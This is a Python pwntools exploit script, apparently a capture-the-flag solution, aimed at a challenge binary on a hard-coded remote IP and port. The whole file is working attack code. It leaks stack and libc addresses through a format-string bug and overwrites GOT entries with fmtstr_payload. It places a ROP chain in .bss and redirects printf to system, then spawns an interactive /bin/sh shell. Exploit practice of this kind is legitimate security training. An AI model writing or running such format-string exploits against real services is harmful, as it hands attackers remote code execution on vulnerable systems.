#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = 'debug'


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("194.31.53.241",1338)

    return r


def main():
    r = conn()
    r.sendline("%20$pLOL%27$p")

    leak = r.recvline().decode().strip()
    print(f"[LEAK] Raw output: {leak}")

    # Extract the actual addresses using regex (safer)
    import re
    matches = re.findall(r'0x[0-9a-fA-F]+', leak)

    if len(matches) >= 2:
        stack_addr = int(matches[0], 16)
        libc_addr = int(matches[1], 16)

        print(f"[+] Stack leak: {hex(stack_addr)}")
        print(f"[+] Libc leak:  {hex(libc_addr)}")

        # Optional: compute libc base
        libc_base = libc_addr - 0x2a1ca
        stack_base = stack_addr - 0x1fe58
        print(f"[+] Libc base:  {hex(libc_base)}")
        print(f"[+] Stack base: {hex(stack_base)}")
        libc.address = libc_base
        print(f"[+] Updated libc base: {hex(libc.address)}")

    else:
        print("[-] Could not extract both addresses from output.")

    target = exe.got['exit']
    target_stack = stack_base + 0x1fc88
    print(f"[+] Target address: {hex(target)}")
    pop_rdi = libc_base + 0x000000000010f75b
    ret = libc_base + 0x000000000002882f
    bin_sh = next(libc.search(b"/bin/sh\x00"))
    # r.sendline(fmtstr_payload(6,{target: pop_rdi}))
    # r.sendline(fmtstr_payload(6, {target + 8: bin_sh}))
    # r.sendline(fmtstr_payload(6, {target + 16: ret}))
    # r.sendline(fmtstr_payload(6, {target + 24: libc.sym['system']}))
    one_gadget = libc_base + 0x583ec
    bss = exe.bss() + 256
    r.sendline(fmtstr_payload(6,{target: ret}))
    r.sendline(fmtstr_payload(6, {bss: pop_rdi}))
    print(f"target Stack : {hex(target_stack)}")
    print(f"[+] LENNNNNNN: {hex(one_gadget)}")
    r.sendline(fmtstr_payload(6, {bss + 8: bin_sh}))
    r.sendline(fmtstr_payload(6, {bss + 16: ret}))
    r.sendline(fmtstr_payload(6, {bss + 24: libc.sym['system']}))
    r.sendline(fmtstr_payload(6,{exe.got['printf']: libc.sym['system']}))
    # sleep(3)
    r.sendline(b"/bin/sh\x00")
    r.interactive()




if __name__ == "__main__":
    main()
